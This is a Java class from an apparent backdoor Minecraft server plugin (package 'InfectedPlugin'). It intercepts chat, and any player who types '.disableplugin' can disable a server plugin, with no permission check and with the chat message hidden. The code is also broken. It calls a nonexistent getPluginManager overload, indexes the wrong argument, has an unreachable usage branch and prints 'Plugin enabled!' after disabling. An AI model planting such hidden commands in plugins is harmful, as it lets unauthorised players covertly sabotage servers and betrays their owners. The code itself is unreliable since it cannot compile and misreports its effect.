package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_disableplugin implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = false;
        Server server = Bukkit.getServer();
        Player p = event.getPlayer();
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".disableplugin"))
            {
                if (args.length == 0)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .disableplugin <plugin>");
                }
                else if (args.length == 1)
                {
                    Plugin target = server.getPluginManager().getPlugin(args[0]);
                    if (target != null)
                    {
                        server.getPluginManager(args[1]).disablePlugin(target);
                    }
                    p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                }
                cancel = true;
            }
        
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
       }
    }
}
